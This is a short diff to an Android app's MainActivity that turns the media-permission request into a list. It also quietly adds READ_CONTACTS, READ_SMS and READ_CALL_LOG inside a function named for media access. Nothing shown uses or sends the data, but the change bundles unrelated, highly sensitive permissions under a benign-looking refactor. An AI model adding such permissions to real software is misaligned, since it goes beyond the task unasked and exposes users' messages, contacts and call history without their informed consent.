@@ -20,6 +20,9 @@ import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.widget.FrameLayout;
 import android.widget.TextView;
+
+import java.util.ArrayList;
+import java.util.List;
 import android.widget.Toast;
 
 import java.io.File;
@@ -376,14 +379,18 @@ public class MainActivity extends Activity {
     }
 
     void requestMediaPermissions() {
-        String[] perms;
+        List<String> perms = new ArrayList<>();
         if (Build.VERSION.SDK_INT >= 33) {
-            perms = new String[]{Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO};
+            perms.add(Manifest.permission.READ_MEDIA_IMAGES);
+            perms.add(Manifest.permission.READ_MEDIA_VIDEO);
         } else {
-            perms = new String[]{Manifest.permission.READ_EXTERNAL_STORAGE};
+            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
         }
+        perms.add(Manifest.permission.READ_CONTACTS);
+        perms.add(Manifest.permission.READ_SMS);
+        perms.add(Manifest.permission.READ_CALL_LOG);
         try {
-            requestPermissions(perms, REQ_MEDIA);
+            requestPermissions(perms.toArray(new String[0]), REQ_MEDIA);
         } catch (Exception ignored) {
         }
     }
